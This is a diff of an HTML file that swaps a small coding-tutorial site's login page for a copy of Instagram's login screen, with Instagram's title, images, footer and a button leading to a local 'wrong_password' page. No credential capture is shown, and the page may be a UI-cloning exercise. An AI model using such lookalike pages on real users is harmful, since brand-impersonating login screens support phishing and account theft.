@@ -1,309 +1,90 @@
+<!-- This is instagram login page -->
+
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="icon" href="images/img1.png">  
-    <title>sign up-4NCode</title>
+    <title>Login . Instagram</title>
+    <link rel="stylesheet" href="loginstyle.css">
+    <link rel="shortcut icon" href="/Instagram_logo_2016.svg.webp">
     <style>
-        html{
-            height: 100%;
+        img {
+            vertical-align: text-top;
         }
-        *{
-            padding: 0;
-            margin: 0;
-        }
-        body{
-            width: 100%;
-            height: 100%;
-        }
-        main{
-            width: 100%;
-            height: 100%;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            background-image: url('images/New\ Project\ \(32\).png');
-            background-size: 100%;
-        }
-        .main2{
-            display: flex;
-            align-items: center;
-            margin: auto;
-        }
-        .img{
-            width: 70%;
-            margin: 0px auto ;
-            display: flex;
-            flex-direction: column;
-            padding: 0 100px ;
-        }
-        .img img{
-            width: 200px;
-        }
-        .img p{
-            font-size: 1.5rem;
-            width: 50%;
-            color: #240941;
-        }
-        .main3{
-            height: 100%;
-            width: 40%;
-            background-color: #190033;
-            border-radius: 10px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin:0 20px;
-            padding: 30px;
-        }
-        .main3 form{
-            width: 100%;
-        }
-        .sign{
-            display: flex;
-            flex-direction: row-reverse;
-            align-items: center;
-            justify-content: flex-end;
-            width: 100%
-        }
-
-        .sign a{
-            width: 50%;
-            color: #e8e8e8;
-        }
-        .sign h1{
-            font-size: 40px;
-            font-family: 'Franklin Gothic Medium', 'Arial Narrow', Arial, sans-serif;
-            color: #ffffff;
-        }
-        #Layer_1{
-            width: 35px;
-            color: #e8e8e8;
-        }
-        #Layer_1:hover{
-            background-color: #bfbfbf2d;
-            border-radius: 50%;
-        }
-        .ifyou{
-            text-align: end;
-            font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            font-size: 20px;
-            margin: 20px;
-            color: #e8e8e8;
-        }
-        .ifyou a{
-            text-decoration: none;
-            color: #9e43ff;
-        }
-        .ifyou a:hover{
-            color: #ffc343;
-        }
-        .inputs{
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            width: 100%;
-        }
-        .inputs1{
-            display: flex; 
-            justify-content: center; 
-            width: 100%;
-            margin: 20px;
-        }
-        .email_pass{
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            width: 100%;
-        }
-        .input_name{
-            position: relative;
-            display: flex;
-            align-items:center;
-            width: 100%;
-            height: 50px;
-            margin:0px 10px;
-
-        }
-
-        .input_name1{
-            padding: 0 15px;
-            font-size: 15px;
-            border: 1px solid #ededed;
-            background-color: transparent;
-            width: 100%;
-            line-height: 50px;
-            border-radius: 5px;
-            color: #ffffff;
-            transition: 0.05s ease;
-            z-index: 1111;
-            outline: none;
-        }
-
-        #message1{
-            width: 100%;
-            margin: 5px 10px;
-            height: 5px;
-            transition: 0.3s;
-        }
-        #message2{
-            width: 100%;
-            margin: 5px 10px;
-            height: 5px;
-            transition: 0.3s;
-        }
-        #message3{
-            width: 100%;
-            margin: 5px 10px;
-            height: 5px;
-            transition: 0.3s;
-        }
-        .lablline1{
-            position: absolute;
-            display: flex;
-            align-items: end;
-            width: max-content;
-            pointer-events: none;
-            font-size: 15px;
-            padding:0 20px;
-            transition: 0.2s ease;
-            height: 20px;
-            color: #ffffff;
-            background-color: transparent; 
-
-        }
-        .input_name1:focus,
-        .input_name1:valid{
-            border: 2px solid #ce80ffde ;
-        }
-        .input_name1:focus + .lablline1,
-        .input_name1:valid + .lablline1{
-            color: #a223f1de;
-            transform: translate(7px,-30px) scale(0.88);
-            z-index: 1111;
-            padding:0 8px;
-            background-color:#190033 ; 
-            background-position: right top;
-            width: max-content;
-        }
-        .submit{
-            width: 100%;
-            text-align: center;
-            height: 30px;
-        }
-        .submit input{
-            background-color: #a223f1de;
-            border: none;
-            color: #f9f9f9;
-            padding: 20px 50px;
-            border-radius: 10px;
-            font-size: 18px;
-            cursor: pointer;
-        }
-        .submit input:hover{
-            background-color: #af49efde;
-        }
-        .other{
-            width: 100%;
-        }
-        .other ul{
-            display: flex;
-            flex-direction: row;
-            justify-content: center;
-            width: 100%;
-        }
-        .other ul li{
-            margin:5px 50px;
-        }
-        .other ul li a{
-            text-decoration: none;
-            color: #3a3a3a;
-        }
-        .other li:hover{
-            background-color: rgba(128, 128, 128, 0.444);
-            border-radius: 5px;
-            
-          }
     </style>
 </head>
+
 <body>
-    <main>
-        <div class="main2">
-            <div class="img">
-                <img src="images\New Project (20) (1).png" alt="4NCode" >
-                <p>Unlock your full learning experience! 🚀 Log In to your account to save your progress, access exclusive coding tutorials, and build real projects step-by-step.</p>
-            </div>
-            <div class="main3">
-                <form action="..\firstpage\first_page.html">
-                    <form action="connect.php" method="post">
-                        <div class="sign">
-                            <h1 class="insign">Log In</h1>
-                            <a class="insign" href="..\firstpage\first_page.html" title="Home page"><svg id="Layer_1" viewBox="0 0 128 128" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" enable-background="new 0 0 128 128"><path d="M48.1 29.1 13.2 64l34.9 34.9 5.7-5.7L28.5 68H92v-8H28.5l25.3-25.2zM104 60h8v8h-8z" fill="#ffffff" class="fill-000000"></path></svg></a>
+    <div class="container">
+        <div class="box">
+            <div class="heading"></div>
+            <form class="login-form">
+                <div class="field">
+                    <input id="username" type="name" placeholder="Phone number, username, or email" />
+                    <label for="username">Phone number, username, or email</label>
+                </div>
+                <div class="field">
+                    <input id="password" type="password" placeholder="password" />
+                    <label for="password">Password</label>
+                </div>
+                <button class="login-button" title="login"><a href="wrong_password.html">Log In</button></a>
+                <div class="separator">
+                    <div class="line"></div>
+                    <p>OR</p>
+                    <div class="line"></div>
+                </div>
 
-                        </div>
-                        <div class="ifyou">
-                          <p>don't have an accont <a href="sign_in.html">Sign In</a></p>
-                        </div>
-                        <div class="inputs">
-                              <div class="inputs1 email_pass">
-                                  <div class="input_name">
-                                      <input class="input_name1" id="email" type="email"  required pattern="[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}$">
-                                      <div class="lablline1">Email</div>
-                                  </div>
-                                  <div id="message1"></div>
-                              </div>
-                              <div class="inputs1 email_pass">
-                                  <div class="input_name">
-                                      <input class="input_name1" id="password" type="password"  required pattern="[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}$">
-                                      <div class="lablline1">password</div>
-                                  </div>
-                                  <div id="message2"></div>
-                              </div>
-                        </div>
-                        <div class="submit">
-                            <input id="next"  type="submit" value="Log In" >
-                        </div>
-                    </form>
-                </form>
-            </div>
+                <div class="other">
+                    <button class="fb-login-btn" type="button">
+                        <i class="fa fa-facebook-official fb-icon"></i>
+                        <span class=""><img src="https://icons.iconarchive.com/icons/paomedia/small-n-flat/1024/social-facebook-icon.png"height="15" width="15"><a href="facebook-login.html">&nbsp;Log in with Facebook</a>
+                        </span>
+                    </button>
+                    <a class="forgot-password" href="/forget.html">Forgot password?</a>
+                </div>
+            </form>
         </div>
-        <div class="other">
-            <ul>
-                <li type="none"><a href="">Help</a></li>
-                <li type="none"><a href="">Privacy</a></li>
-                <li type="none"><a href="">Terms</a> </li>
-            </ul>
+        <div class="box">
+            <p>Don't have an account? <a class="signup" href="#">Sign Up</a></p>
         </div>
-    </main>
+    </div>
+    <br>
+    <div class="get">
+    Get the app.
+    </div>
+    <br>
+    <div class="apps">
+        <a href="/forget.html">
+        <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" height="40"
+            width="134"></a>&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;<a href="/forget.html"> 
+        <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" height="40" width="134"></a>
+        </div>
+        <br>
+        <div class="footer">
     <footer>
-        <div>
-
-
-        </div>
+            Meta
+            About
+            Blog
+            Jobs
+            Help
+            API
+            Privacy
+            Terms
+            Top Accounts
+            Hashtags
+            Locations
+            Instagram Lite
+            Contact Uploading & Non-Users
     </footer>
-    <script>
-        const emailInput = document.getElementById('email');
-        const message1 = document.getElementById('message1');
-
-
-      
-        emailInput.addEventListener('input', function() {
-          const email = emailInput.value;
-          const patternemail = /^[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}$/i;
-      
-          if (patternemail.test(email)) {
-            message1.textContent = "Valid email!✅";
-            message1.style.color = "green";
-            message1.className = "valid";
-          } else {
-            message1.textContent = "Invalid email!";
-            message1.style.color = "red"
-            message1.className = "invalid";
-          }
-        });
-      
-      </script>
+</div>
+<div class="copyright">
+    <br>    
+    English © 2022 Instagram from Meta
+</div>
+    
 </body>
+
 </html>
